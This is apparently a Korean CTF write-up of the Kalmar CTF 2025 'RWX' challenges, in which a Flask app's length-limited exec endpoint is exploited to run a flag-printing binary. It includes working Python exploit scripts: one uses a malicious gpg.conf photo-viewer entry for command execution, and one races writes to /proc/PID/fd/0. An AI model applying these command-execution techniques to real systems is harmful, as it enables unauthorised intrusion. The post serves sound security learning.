+++
title = "Kalmar CTF 2025 - RWX series"
date = "2025-03-13"
description = "Kalmar CTF 2025 misc challenge"

[taxonomies]
tags = ["ctf", "misc", "linux", "gpg", "race condition"]
+++

## 0x00. Introduction
``` docker
FROM ubuntu:latest

RUN apt-get update && \
    apt-get install -y python3 python3-pip gcc
RUN pip3 install flask==3.1.0 --break-system-packages

WORKDIR /
COPY flag.txt /
RUN chmod 400 /flag.txt

COPY would.c /
RUN gcc -o would would.c && \
    chmod 6111 would && \
    rm would.c

WORKDIR /app
COPY app.py .

RUN useradd -m user
USER user

CMD ["python3", "app.py"]
```

`Dockerfile`을 보면 `would.c`를 빌드해서 `/` 디렉토리 밑에 `would` 바이너리를 생성한다.

flask로 구동되는 웹 서버를 올리는데 이를 이용해서 flag를 획득해야 한다.

### Concept
``` c
int main(int argc, char *argv[]) {
    char full_cmd[256] = {0}; 
    for (int i = 1; i < argc; i++) {
        strncat(full_cmd, argv[i], sizeof(full_cmd) - strlen(full_cmd) - 1);
        if (i < argc - 1) strncat(full_cmd, " ", sizeof(full_cmd) - strlen(full_cmd) - 1);
    }

    if (strstr(full_cmd, "you be so kind to provide me with a flag")) {
        FILE *flag = fopen("/flag.txt", "r");
        if (flag) {
            char buffer[1024];
            while (fgets(buffer, sizeof(buffer), flag)) {
                printf("%s", buffer);
            }
            fclose(flag);
            return 0;
        }
    }

    printf("Invalid usage: %s\n", full_cmd);
    return 1;
}
```

`would.c`를 보면 `/would you be so kind to provide me with a flag`로 바이너리를 실행해서 flag를 획득할 수 있다.

``` python
@app.route('/read')
def read():
    filename = request.args.get('filename', '')
    try:
        return send_file(filename)
    except Exception as e:
        return str(e), 400

@app.route('/write', methods=['POST'])
def write():
    filename = request.args.get('filename', '')
    content = request.get_data()
    try:
        with open(filename, 'wb') as f:
            f.write(content)
        return 'OK'
    except Exception as e:
        return str(e), 400

@app.route('/exec')
def execute():
    cmd = request.args.get('cmd', '')
    if len(cmd) > 7:
        return 'Command too long', 400
    try:
        output = subprocess.check_output(cmd, shell=True)
        return output
    except Exception as e:
        return str(e), 400

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=6664)
```

`app.py`를 보면 `user` 권한으로 arbitrary read / write가 가능하고 명령어 실행은 길이 제한이 있다.

이런 식으로 RWX-Bronze, RWX-Silver, RWX-Gold, RWX-Diamond가 있는데 길이가 점점 줄어들거나 환경이 바뀌는 형식이다.

## 0x01. RWX-Bronze
제일 처음 문제인 Bronze에서는 7바이트 제한이 걸려있다.

``` python
@app.route('/exec')
def execute():
    cmd = request.args.get('cmd', '')
    if len(cmd) > 7:
        return 'Command too long', 400
    try:
        output = subprocess.check_output(cmd, shell=True)
        return output
    except Exception as e:
        return str(e), 400
```

`/write` 엔드포인트를 이용해서 다음 내용을 `/home/user/x`라는 파일에 저장했다.

``` bash
/would you be so kind to provide me with a flag
```

이후 `/exec` 엔드포인트를 통해 다음 명령어를 실행해주면 된다.
- `sh<~x`

## 0x02. RWX-Silver
이번에는 5바이트 제한이 걸려있다.

``` python
@app.route('/exec')
def execute():
    cmd = request.args.get('cmd', '')
    if len(cmd) > 5:
        return 'Command too long', 400
    try:
        output = subprocess.check_output(cmd, shell=True)
        return output
    except Exception as e:
        return str(e), 400
```

Bronze와 마찬가지로 `/home/user/x`를 생성하고 다음 명령어를 실행해주면 된다.
- `. ~/x`

## 0x03. RWX-Gold
이번에는 3바이트인데 여기부터는 대회중에 못풀었다.

``` python
@app.route('/exec')
def execute():
    cmd = request.args.get('cmd', '')
    if len(cmd) > 3:
        return 'Command too long', 400
    try:
        output = subprocess.check_output(cmd, shell=True)
        return output
    except Exception as e:
        return str(e), 400
```

`. ~`, `~/*`, `~;*` 등 다양하게 시도를 해봤는데 다 실패했다.

나중에 writeup을 보니 pgp의 gnu 버전인 gpg(Gnu Privacy Guard)라는 도구를 이용해야 했다.

살면서 처음 들어보는 도구인데 놀랍게도 ubuntu에 기본으로 깔려있다.

Exploit 시나리오를 위해 잠시 pgp에 대한 background를 설명하자면,

- pgp 키는 여러 개의 패킷(packet)으로 구성
  - 공개 키 패킷
  - 비밀 키 패킷
  - 사용자 ID 패킷
  - 서명 패킷
  - 사진 ID 패킷
  - ...
- `gpg.conf` 파일을 통해 gpg의 동작 방식을 제어할 수 있음
  - `list-options` : `gpg --list-keys` 실행 시 옵션을 설정하는 tag
    - `show-photos` : 키를 나열할 때 pgp 키에 첨부된 사진 표시
  - `photo-viewer` : pgp 키에 첨부된 사진을 표시할 때 사용할 프로그램을 지정하는 tag
  - `list-keys` : 이 옵션이 `gpg.conf`에 있으면 `gpg` 실행 시 자동으로 키 목록을 표시
  
설명이 gpg, pgp를 왔다갔다 하는데 서로 호환되게 구현된 것이므로 틀린 표현은 아니다.

따라서 다음과 같은 내용을 `/home/user/.gnupg/gpg.conf`라는 파일에 저장한다.

``` conf
list-options show-photos
photo-viewer /would you be so kind to provide me with a flag > /tmp/x 
list-keys
```

이후 `gpg` 명령을 실행해주면 설정값에 따라 키 목록을 표시하게 되고, 그 과정에서 사진을 출력할 바이너리가 `/would you be so kind to provide me with a flag > /tmp/x`으로 지정되어있으므로 사진을 출력할 때 명령어가 실행된다.

### Payload
``` python
import requests
import base64

url = "http://localhost:6664"

def rwx_read(filename):
    uri = url + "/read"
    uri += "?filename=" + filename
    return requests.get(uri)

def rwx_write(filename, data):
    uri = url + "/write"
    uri += "?filename=" + filename
    return requests.post(uri, data=data)

def rwx_exec(cmd):
    uri = url + "/exec"
    uri += "?cmd=" + cmd
    return requests.get(uri)

def main():
    rwx_exec("gpg")
    gpg_conf_content = (
        "list-options show-photos\n"
        "photo-viewer /would you be so kind to provide me with a flag > /tmp/x\n"
        "list-keys\n"
    )
    rwx_write("/home/user/.gnupg/gpg.conf", gpg_conf_content)

    with open("pubring.kbx", "rb") as f:
        pubring_data = f.read()
    rwx_write("/home/user/.gnupg/pubring.kbx", pubring_data)
    
    rwx_exec("gpg")
    r = rwx_read("/tmp/x")
    print(r.text)

if __name__ == '__main__':
    main()
```

## 0x04. RWX-Diamond
마지막 문제는 오히려 4바이트로 길이가 늘어났다.

``` python
@app.route('/exec')
def execute():
    cmd = request.args.get('cmd', '')
    if len(cmd) > 4:
        return 'Command too long', 400
    try:
        output = subprocess.check_output(cmd, shell=True)
        return output
    except Exception as e:
        return str(e), 400
```

하지만 `Dockerfile`을 보면 달라진게 있다.

``` docker
...
# RUN useradd -m user
RUN useradd user
USER user

CMD ["python3", "app.py"]
```

`useradd`를 할 때 `-m` 옵션이 없기 때문에 `/home/user` 디렉토리가 생성되지 않아서 기존 방식을 사용할 수 없다.

마찬가지로 대회중에 못풀어서 writeup을 확인해보니 race condition으로 해결할 수 있었다.

``` bash
➜  rwx-diamond curl "http://localhost:6664/exec?cmd=ps"
    PID TTY          TIME CMD
      1 ?        00:00:00 python3
      8 ?        00:00:00 sh
      9 ?        00:00:00 ps
➜  rwx-diamond curl "http://localhost:6664/exec?cmd=ps"
    PID TTY          TIME CMD
      1 ?        00:00:00 python3
     11 ?        00:00:00 sh
     12 ?        00:00:00 ps
```

이런 식으로 명령어를 연속으로 실행할 경우 pid가 `3`만큼 증가하므로 다음 프로세스의 pid를 예측할 수 있다.

Exploit 시나리오는 다음과 같다.

|write|exec|
|:---|---:|
|write process 생성||
||exec process 생성|
|write "/would you ..." to `STDIN` of `sh`||
||execute `w\|sh`|

`w|sh` 명령을 실행하는 이유는 길이가 4바이트까지이고 `sh` 프로세스에 `STDIN`을 줘야하기 때문에 한 바이트짜리 명령어인 `w`를 사용하는 것이다.

존재하지 않는 명령어를 `STDIN`으로 줘도 될 것 같지만 time window가 다른지 존재하는 명령어가 성공 확률이 높다고 한다.

이 때 `w|sh`는 `sh`라는 또 다른 프로세스를 생성하므로 pid를 `3`이 아닌 `4`만큼 증가시켜야 한다.

컨셉은 간단한데 발상이 대단한 것 같다.

### Payload
``` python
import requests
import threading
from time import sleep

url = "http://localhost:6664"
cmd = "/would you be so kind to provide me with a flag"

def race_fd():
    global pid
    requests.post(f"{url}/write?filename=/proc/{pid}/fd/0", data=cmd)

def race_cmd():
    global res
    res = requests.get(f"{url}/exec?cmd=w|sh").text

def rwx_exec(cmd):
    uri = url + "/exec"
    uri += "?cmd=" + cmd
    return requests.get(uri)

while True:
    r = rwx_exec("ps")
    pid = int(r.text.split("\n")[-2].split()[0])
    pid += 4
    print(f"[*] trying {pid}")

    thread_cmd = threading.Thread(target=race_cmd)
    thread_fd = threading.Thread(target=race_fd)

    thread_fd.start()
    thread_cmd.start()
    thread_cmd.join()
    thread_fd.join()

    if "kalmar{" in res:
        print(res)
        break
    
    sleep(0.1)
```